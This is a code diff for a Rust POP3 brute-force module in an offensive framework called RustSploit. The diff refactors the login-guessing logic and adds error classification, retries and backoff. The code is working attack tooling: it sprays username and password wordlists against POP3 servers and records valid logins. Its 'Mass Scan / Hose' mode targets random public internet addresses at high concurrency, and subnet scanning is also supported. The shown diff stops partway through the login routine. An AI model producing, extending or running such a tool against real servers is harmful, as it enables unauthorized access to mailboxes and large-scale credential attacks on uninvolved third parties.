@@ -1,582 +1,392 @@
-use anyhow::{anyhow, Result, Context};
+use anyhow::{anyhow, Result};
 use colored::*;
 use native_tls::TlsConnector;
 use std::io::{Read, Write};
-use std::net::TcpStream;
-use std::sync::{
-    atomic::{AtomicBool, Ordering},
-    Arc,
-};
+use std::net::IpAddr;
 use std::time::Duration;
-use tokio::sync::{Mutex, Semaphore};
-use futures::stream::{FuturesUnordered, StreamExt};
 
 use crate::utils::{
     load_lines,
     cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
 };
-use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};
-use std::sync::atomic::AtomicUsize;
-use std::net::{IpAddr, SocketAddr}; 
-use tokio::fs::OpenOptions; // For file writing in mass scan
-use tokio::io::AsyncWriteExt; // For write_all
+use crate::modules::creds::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig,
+    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
+    backoff_delay,
+};
 
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "POP3 Brute Force".to_string(),
+        description: "Brute-force POP3 authentication with SSL/TLS support. Tests credentials against POP3 mail servers with combo mode, retry logic, and subnet/mass scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
+}
 
-const STATE_FILE: &str = "pop3_hose_state.log";
-const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
+// ============================================================================
+// Error Classification
+// ============================================================================
 
-// Hardcoded exclusions
-const EXCLUDED_RANGES: &[&str] = &[
-    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
-    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
-    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
-    // Cloudflare
-    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
-    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
-    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
-    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
-    "1.1.1.1/32", "1.0.0.1/32",
-    // Google
-    "8.8.8.8/32", "8.8.4.4/32"
-];
-#[derive(Clone)]
-struct Pop3BruteforceConfig {
-    target: String,
-    port: u16,
-    username_wordlist: String,
-    password_wordlist: String,
-    threads: usize,
-    stop_on_success: bool,
-    verbose: bool,
-    full_combo: bool,
-    use_ssl: bool,
-    connection_timeout: u64,
-    retry_on_error: bool,
-    max_retries: usize,
-    output_file: String,
-    delay_ms: u64,
+#[derive(Debug, Clone, PartialEq)]
+enum Pop3ErrorType {
+    AuthenticationFailed,
+    ConnectionRefused,
+    ConnectionTimeout,
+    TlsError,
+    Unknown,
+}
+
+impl Pop3ErrorType {
+    /// Classify a POP3 error from its message string for smarter retry decisions.
+    fn classify_error(msg: &str) -> Self {
+        let lower = msg.to_lowercase();
+        if lower.contains("authentication")
+            || lower.contains("login")
+            || lower.contains("-err")
+            || lower.contains("invalid credential")
+            || lower.contains("bad password")
+        {
+            Self::AuthenticationFailed
+        } else if lower.contains("refused")
+            || lower.contains("reset")
+            || lower.contains("broken pipe")
+        {
+            Self::ConnectionRefused
+        } else if lower.contains("timeout")
+            || lower.contains("timed out")
+            || lower.contains("deadline")
+        {
+            Self::ConnectionTimeout
+        } else if lower.contains("tls")
+            || lower.contains("ssl")
+            || lower.contains("certificate")
+            || lower.contains("handshake")
+        {
+            Self::TlsError
+        } else {
+            Self::Unknown
+        }
+    }
+
+    /// Whether this error type is worth retrying.
+    fn is_retryable(&self) -> bool {
+        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
+    }
+
+    fn description(&self) -> &'static str {
+        match self {
+            Self::AuthenticationFailed => "Authentication failed",
+            Self::ConnectionRefused => "Connection refused/reset",
+            Self::ConnectionTimeout => "Connection timed out",
+            Self::TlsError => "TLS/SSL error",
+            Self::Unknown => "Unknown error",
+        }
+    }
+}
+
+#[derive(Debug)]
+struct Pop3Error {
+    error_type: Pop3ErrorType,
+    message: String,
+}
+
+impl std::fmt::Display for Pop3Error {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "[{}] {}", self.error_type.description(), self.message)
+    }
+}
+
+impl std::error::Error for Pop3Error {}
+
+impl Pop3Error {
+    fn from_anyhow(err: anyhow::Error) -> Self {
+        let msg = err.to_string();
+        let error_type = Pop3ErrorType::classify_error(&msg);
+        Self { error_type, message: msg }
+    }
 }
 
 pub async fn run(target: &str) -> Result<()> {
-    println!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
-    println!();
+    crate::mprintln!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
+    crate::mprintln!();
 
-    // Check for Mass Scan Mode conditions
-    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
+    // --- Mass Scan Mode ---
+    if is_mass_scan_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
+        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());
 
-    if is_mass_scan {
-        println!("{}", format!("[*] Target: {}", target).cyan());
-        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
-        return run_mass_scan(target).await;
+        let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
+        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = std::sync::Arc::new(load_lines(&usernames_file)?);
+        let passes = std::sync::Arc::new(load_lines(&passwords_file)?);
+        if users.is_empty() { return Err(anyhow!("User list empty")); }
+        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+        return run_mass_scan(target, MassScanConfig {
+            protocol_name: "POP3",
+            default_port: if use_ssl { 995 } else { 110 },
+            state_file: "pop3_hose_state.log",
+            default_output: "pop3_mass_results.txt",
+            default_concurrency: 500,
+        }, move |ip: IpAddr, port: u16| {
+            let users = users.clone();
+            let passes = passes.clone();
+            async move {
+                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
+                    return None;
+                }
+
+                let target_str = ip.to_string();
+                for user in users.iter() {
+                    for pass in passes.iter() {
+                        let mut retry_attempt: u32 = 0;
+                        let max_retries: u32 = 3;
+                        let mut should_skip_host = false;
+                        loop {
+                            let t = target_str.clone();
+                            let u = user.clone();
+                            let p = pass.clone();
+                            let res = tokio::task::spawn_blocking(move || {
+                                attempt_pop3_login(&t, port, &u, &p, use_ssl, 5)
+                            }).await;
+                            match res {
+                                Ok(Ok(true)) => {
+                                    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
+                                    let line = format!("[{}] {}:{}:{}:{}\n", now, ip, port, user, pass);
+                                    crate::mprintln!("\r{}", format!("[+] FOUND: {}:{}:{}:{}", ip, port, user, pass).green().bold());
+                                    return Some(line);
+                                }
+                                Ok(Ok(false)) => break, // auth failed, try next credential
+                                Ok(Err(e)) => {
+                                    if e.error_type.is_retryable() && retry_attempt < max_retries {
+                                        retry_attempt += 1;
+                                        let delay = backoff_delay(500, retry_attempt, 8);
+                                        tokio::time::sleep(delay).await;
+                                        continue;
+                                    }
+                                    should_skip_host = true;
+                                    break;
+                                }
+                                Err(_) => {
+                                    should_skip_host = true;
+                                    break;
+                                }
+                            }
+                        }
+                        if should_skip_host {
+                            return None;
+                        }
+                    }
+                }
+                None
+            }
+        }).await;
     }
 
+    // --- Subnet Scan Mode ---
     if is_subnet_target(target) {
-        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
-        return run_subnet_scan(target).await;
+        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+
+        let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
+        let default_port = if use_ssl { 995 } else { 110 };
+        let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
+        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() { return Err(anyhow!("User list empty")); }
+        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_subnet_results.txt").await?;
+
+        let connection_timeout: u64 = 5;
+
+        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
+            concurrency,
+            verbose,
+            output_file,
+            service_name: "pop3",
+            source_module: "creds/generic/pop3_bruteforce",
+            skip_tcp_check: false,
+        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
+            async move {
+                let target_str = ip.to_string();
+                let res = tokio::task::spawn_blocking(move || {
+                    attempt_pop3_login(&target_str, port, &user, &pass, use_ssl, connection_timeout)
+                }).await;
+                match res {
+                    Ok(Ok(true)) => LoginResult::Success,
+                    Ok(Ok(false)) => LoginResult::AuthFailed,
+                    Ok(Err(e)) => LoginResult::Error {
+                        message: e.message,
+                        retryable: e.error_type.is_retryable(),
+                    },
+                    Err(e) => LoginResult::Error {
+                        message: format!("Task panic: {}", e),
+                        retryable: false,
+                    },
+                }
+            }
+        }).await;
     }
 
-    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
+    // --- Single Target Mode ---
+    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
     let default_port = if use_ssl { 995 } else { 110 };
-    
-    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
-    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
-    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
-    
-    let threads = cfg_prompt_int_range("threads", "Threads", 16, 1, 256)? as usize;
-    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000)? as u64;
-    let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60)? as u64;
-    
-    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false)?;
-    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false)?;
-    
-    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt")?;
-    
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry failed connections?", true)?;
-    let max_retries = if retry_on_error { 
-        cfg_prompt_int_range("max_retries", "Max retries", 2, 1, 10)? as usize
-    } else { 
-        0 
+
+    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
+    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
+    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
+
+    let threads = cfg_prompt_int_range("threads", "Threads", 16, 1, 256).await? as usize;
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
+    let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60).await? as u64;
+
+    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false).await?;
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false).await?;
+
+    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt").await?;
+
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry failed connections?", true).await?;
+    let max_retries = if retry_on_error {
+        cfg_prompt_int_range("max_retries", "Max retries", 2, 1, 10).await? as usize
+    } else {
+        0
     };
 
-    let config = Pop3BruteforceConfig {
+    let usernames = load_lines(&username_wordlist)?;
+    let passwords = load_lines(&password_wordlist)?;
+    if usernames.is_empty() || passwords.is_empty() {
+        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
+    }
+
+    crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
+
+    let combos = generate_combos(&usernames, &passwords, full_combo);
+
+    crate::mprintln!();
+    crate::mprintln!("{}", "[Starting Attack]".bold().yellow());
+    crate::mprintln!();
+
+    let try_login = move |t: String, p: u16, user: String, pass: String| {
+        async move {
+            let res = tokio::task::spawn_blocking(move || {
+                attempt_pop3_login(&t, p, &user, &pass, use_ssl, connection_timeout)
+            }).await;
+            match res {
+                Ok(Ok(true)) => LoginResult::Success,
+                Ok(Ok(false)) => LoginResult::AuthFailed,
+                Ok(Err(e)) => LoginResult::Error {
+                    message: e.message,
+                    retryable: e.error_type.is_retryable(),
+                },
+                Err(e) => LoginResult::Error {
+                    message: format!("Task panic: {}", e),
+                    retryable: false,
+                },
+            }
+        }
+    };
+
+    let result = run_bruteforce(&BruteforceConfig {
         target: target.to_string(),
         port,
-        username_wordlist,
-        password_wordlist,
-        threads,
+        concurrency: threads,
         stop_on_success,
         verbose,
-        full_combo,
-        use_ssl,
-        connection_timeout,
-        retry_on_error,
-        max_retries,
-        output_file,
         delay_ms,
-    };
+        max_retries,
+        service_name: "pop3",
+        source_module: "creds/generic/pop3_bruteforce",
+    }, combos, try_login).await?;
 
-    println!();
-    println!("{}", "[Starting Attack]".bold().yellow());
-    println!();
-
-    run_pop3_bruteforce(config).await
-}
-
-async fn run_mass_scan(target: &str) -> Result<()> {
-    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
-    let default_port = if use_ssl { 995 } else { 110 };
-    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
-    
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    
-    let users = load_lines(&usernames_file)?;
-    let pass_lines = load_lines(&passwords_file)?;
-
-    if users.is_empty() { return Err(anyhow!("User list empty")); }
-    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
-
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?; 
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_mass_results.txt")?;
-
-    // Parse exclusions
-    let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-
-    let creds_pkg = Arc::new((users, pass_lines, use_ssl));
-
-    // Stats
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(Duration::from_secs(5)).await;
-            println!(
-                "[*] Status: {} IPs scanned, {} valid POP3 credentials found",
-                s_checked.load(Ordering::Relaxed),
-                s_found.load(Ordering::Relaxed).to_string().green().bold()
-            );
-        }
-    });
-
-    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
-
-    if run_random {
-        println!("{}", "[*] Starting Random Internet Scan...".green());
-        loop {
-             let permit = match semaphore.clone().acquire_owned().await {
-                 Ok(p) => p,
-                 Err(_) => break, // Semaphore closed, exit loop
-             };
-             let exc = exclusions.clone();
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             tokio::spawn(async move {
-                 let ip = generate_random_public_ip(&exc);
-                 if !is_ip_checked(&ip, STATE_FILE).await {
-                     mark_ip_checked(&ip, STATE_FILE).await;
-                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
-                 }
-                 sc.fetch_add(1, Ordering::Relaxed);
-                 drop(permit);
-             });
-        }
-    } else {
-        // File Mode
-        let content = tokio::fs::read_to_string(target).await
-            .context(format!("Failed to read target file: {}", target))?;
-        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
-        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
-
-        for ip_str in lines {
-             let permit = match semaphore.clone().acquire_owned().await {
-                 Ok(p) => p,
-                 Err(_) => continue, // Skip this IP if semaphore closed
-             };
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             if let Ok(ip) = ip_str.parse::<IpAddr>() {
-                 tokio::spawn(async move {
-                    if !is_ip_checked(&ip, STATE_FILE).await {
-                        mark_ip_checked(&ip, STATE_FILE).await;
-                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
-                    }
-                    sc.fetch_add(1, Ordering::Relaxed);
-                    drop(permit);
-                 });
-             } else {
-                 drop(permit); 
-             }
-        }
-        for _ in 0..concurrency {
-            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
-        }
-    }
-    
-    Ok(())
-}
-
-async fn run_subnet_scan(target: &str) -> Result<()> {
-    let network = parse_subnet(target)?;
-    let count = subnet_host_count(&network);
-    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
-
-    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
-    let default_port = if use_ssl { 995 } else { 110 };
-    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    let users = load_lines(&usernames_file)?;
-    let passes = load_lines(&passwords_file)?;
-    if users.is_empty() { return Err(anyhow!("User list empty")); }
-    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
-
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_subnet_results.txt")?;
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-    let creds_pkg = Arc::new((users, passes, use_ssl));
-    let total = count;
-
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
-            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
-                s_checked.load(Ordering::Relaxed), total,
-                s_found.load(Ordering::Relaxed).to_string().green().bold());
-        }
-    });
-
-    for ip in network.iter() {
-        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
-        let cp = creds_pkg.clone();
-        let sc = stats_checked.clone();
-        let sf = stats_found.clone();
-        let of = output_file.clone();
-
-        tokio::spawn(async move {
-            mass_scan_host(ip, port, cp, sf, of, verbose).await;
-            sc.fetch_add(1, Ordering::Relaxed);
-            drop(permit);
-        });
-    }
-
-    for _ in 0..concurrency {
-        let _ = semaphore.acquire().await.context("Semaphore")?;
-    }
-
-    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
-        stats_checked.load(Ordering::Relaxed),
-        stats_found.load(Ordering::Relaxed)).cyan().bold());
-    Ok(())
-}
-
-async fn mass_scan_host(
-    ip: IpAddr, 
-    port: u16,
-    creds: Arc<(Vec<String>, Vec<String>, bool)>,
-    stats_found: Arc<AtomicUsize>,
-    output_file: String,
-    verbose: bool
-) {
-    let sa = SocketAddr::new(ip, port);
-    
-    // 1. Connection Check
-    if tokio::time::timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), tokio::net::TcpStream::connect(&sa)).await.is_err() {
-        return;
-    }
-
-    let (users, passes, use_ssl) = &*creds;
-
-    let target_str = ip.to_string();
-
-    // Construct a config for the attempt function
-    // We can't reuse the large config struct easily without creating dummy values, 
-    // so we'll just reconstruct the necessary parts or make attempt_pop3_login take separate args.
-    // For now, I'll build a dummy config.
-    let dummy_wordlist = "dummy".to_string();
-    
-    for user in users {
-        for pass in passes {
-            let t_target = target_str.clone();
-            let t_user = user.clone();
-            let t_pass = pass.clone();
-            let t_use_ssl = *use_ssl;
-            let dw = dummy_wordlist.clone();
-            
-            // Blocking call
-            let res = tokio::task::spawn_blocking(move || {
-                let config = Pop3BruteforceConfig {
-                    target: t_target,
-                    port,
-                    username_wordlist: dw.clone(),
-                    password_wordlist: dw.clone(),
-                    threads: 1,
-                    stop_on_success: false,
-                    verbose,
-                    full_combo: false,
-                    use_ssl: t_use_ssl,
-                    connection_timeout: 5, // 5 seconds for login attempt
-                    retry_on_error: false,
-                    max_retries: 0,
-                    output_file: "".to_string(),
-                    delay_ms: 0,
-                };
-                attempt_pop3_login(&config, &t_user, &t_pass)
-            }).await;
-
-            match res {
-                Ok(Ok(true)) => {
-                    let msg = format!("{} -> {}:{}", ip, user, pass);
-                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
-                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
-                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
-                    }
-                    stats_found.fetch_add(1, Ordering::Relaxed);
-                    return; // Stop after first success
-                }
-                Ok(Ok(false)) => {
-                    // Auth failed
-                }
-                Ok(Err(_)) => {
-                     // Connection error - abort this host
-                     return;
-                }
-                Err(_) => {
-                    // Start/Join error
-                }
-            }
-        }
-    }
-}
-
-async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
-    // Determine loading strategy
-    let usernames = load_lines(&config.username_wordlist)?;
-    let passwords = load_lines(&config.password_wordlist)?;
-
-    let total_attempts = if config.full_combo {
-        usernames.len() * passwords.len()
-    } else {
-        std::cmp::max(usernames.len(), passwords.len())
-    };
-
-    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
-    println!("[*] Total attempts: {}", total_attempts);
-
-    let stats = Arc::new(BruteforceStats::new());
-    let found_creds = Arc::new(Mutex::new(Vec::new()));
-    let stop_signal = Arc::new(AtomicBool::new(false));
-    let start_time = std::time::Instant::now();
-
-    // Start progress reporter
-    let stats_clone = stats.clone();
-    let stop_clone = stop_signal.clone();
-    let progress_handle = tokio::spawn(async move {
-        while !stop_clone.load(Ordering::Relaxed) {
-             tokio::time::sleep(Duration::from_secs(2)).await;
-             stats_clone.print_progress();
-        }
-    });
-
-    let semaphore = Arc::new(Semaphore::new(config.threads));
-    let mut tasks = FuturesUnordered::new();
-
-    // Generate combinations
-    let mut combos = Vec::new();
-    if config.full_combo {
-        for u in &usernames {
-            for p in &passwords {
-                combos.push((u.clone(), p.clone()));
-            }
-        }
-    } else {
-        // Linear mix: try u[0] p[0], u[1] p[1]... cycle if needed
-        let max_len = std::cmp::max(usernames.len(), passwords.len());
-        for i in 0..max_len {
-            let u = &usernames[i % usernames.len()];
-            let p = &passwords[i % passwords.len()];
-            combos.push((u.clone(), p.clone()));
-        }
-    }
-
-    // Process combinations
-    for (user, pass) in combos {
-         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
-            break;
-         }
-
-         let permit = semaphore.clone().acquire_owned().await?;
-         let config_clone = config.clone();
-         let stats_clone = stats.clone();
-         let found_clone = found_creds.clone();
-         let stop_signal_clone = stop_signal.clone();
-         let user_clone = user.clone();
-         let pass_clone = pass.clone();
-
-         tasks.push(tokio::spawn(async move {
-             let _permit = permit; // Hold permit
-             
-             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                 return;
-             }
-             
-             // Retry loop
-             let mut retries = 0;
-             loop {
-                 let config_inner = config_clone.clone();
-                 let user_inner = user_clone.clone();
-                 let pass_inner = pass_clone.clone();
-                 
-                 let res = tokio::task::spawn_blocking(move || {
-                     attempt_pop3_login(&config_inner, &user_inner, &pass_inner)
-                 }).await;
-
-                 match res {
-                     Ok(Ok(true)) => {
-                         println!("\r{}", format!("[+] Found: {}:{}", user, pass).green().bold());
-                         found_clone.lock().await.push((user.clone(), pass.clone()));
-                         stats_clone.record_success();
-                         if config_clone.stop_on_success {
-                             stop_signal_clone.store(true, Ordering::Relaxed);
-                         }
-                         break;
-                     },
-                     Ok(Ok(false)) => {
-                         stats_clone.record_failure();
-                         if config_clone.verbose {
-                             println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
-                         }
-                         break;
-                     },
-                     Ok(Err(e)) => {
-                         if config_clone.retry_on_error && retries < config_clone.max_retries {
-                             retries += 1;
-                             stats_clone.record_retry();
-                             // Small backoff
-                             tokio::time::sleep(Duration::from_millis(500)).await;
-                             continue;
-                         }
-                         stats_clone.record_error(e.to_string()).await;
-                         if config_clone.verbose {
-                              println!("\r{}", format!("[!] Error {}:{}: {}", user, pass, e).red());
-                         }
-                         break;
-                     },
-                     Err(e) => {
-                          stats_clone.record_error(format!("Task panic: {}", e)).await;
-                          break;
-                     }
-                 }
-             }
-             
-             if config_clone.delay_ms > 0 {
-                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
-             }
-         }));
-         
-         // Drain finished tasks to keep memory low
-          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {
-             // Just drain
-         }
-    }
-
-    // Wait for remaining
-    while let Some(_) = tasks.next().await {}
-
-    stop_signal.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-    
-    let elapsed = start_time.elapsed();
-    println!("[*] Elapsed: {:.1}s", elapsed.as_secs_f64());
-    stats.print_final().await;
-    
-    // Save results
-    let found = found_creds.lock().await;
-    if !found.is_empty() {
-        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
-            for (u, p) in found.iter() {
-                let _ = writeln!(file, "{}:{}", u, p);
-            }
-            println!("[+] Results saved to {}", config.output_file);
-        }
-    }
+    result.print_found();
+    result.save_to_file(&output_file)?;
 
     Ok(())
 }
 
+/// POP3 login result: Ok(true) = authenticated, Ok(false) = auth rejected, Err = classified error.
+fn attempt_pop3_login(target: &str, port: u16, user: &str, pass: &str, use_ssl: bool, timeout_secs: u64) -> std::result::Result<bool, Pop3Error> {
+    let addr = format!("{}:{}", target, port);
+    let timeout = Duration::from_secs(timeout_secs);
 
+    if use_ssl {
+        let connector = TlsConnector::new().map_err(|e| Pop3Error {
+            error_type: Pop3ErrorType::TlsError,
+            message: e.to_string(),
+        })?;
+        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?
+            .next()
+            .ok_or_else(|| Pop3Error { error_type: Pop3ErrorType::ConnectionRefused, message: "Resolution failed".to_string() })?;
+        let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let _ = stream.set_nodelay(true);
+        stream.set_read_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        stream.set_write_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
 
-// Blocking login attempt
-fn attempt_pop3_login(config: &Pop3BruteforceConfig, user: &str, pass: &str) -> Result<bool> {
-    let addr = format!("{}:{}", config.target, config.port);
-    let timeout = Duration::from_secs(config.connection_timeout);
-    
-    if config.use_ssl {
-        let connector = TlsConnector::new()?;
-        // Resolve first to apply timeout to connect
-        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
-        let stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
-        stream.set_read_timeout(Some(timeout))?;
-        stream.set_write_timeout(Some(timeout))?;
-        
-        let mut stream = connector.connect(&config.target, stream)?;
-        
+        let mut stream = connector.connect(target, stream).map_err(|e| Pop3Error {
+            error_type: Pop3ErrorType::TlsError,
+            message: e.to_string(),
+        })?;
+
         // Read banner
         let mut buffer = [0; 1024];
-        stream.read(&mut buffer)?; // +OK ...
-        
-        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
-        let n = stream.read(&mut buffer)?;
+        stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+
+        stream.write_all(format!("USER {}\r\n", user).as_bytes())
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
         if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
             return Ok(false);
         }
-        
-        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
-        let n = stream.read(&mut buffer)?;
+
+        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())
+            .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
+        let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
         if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
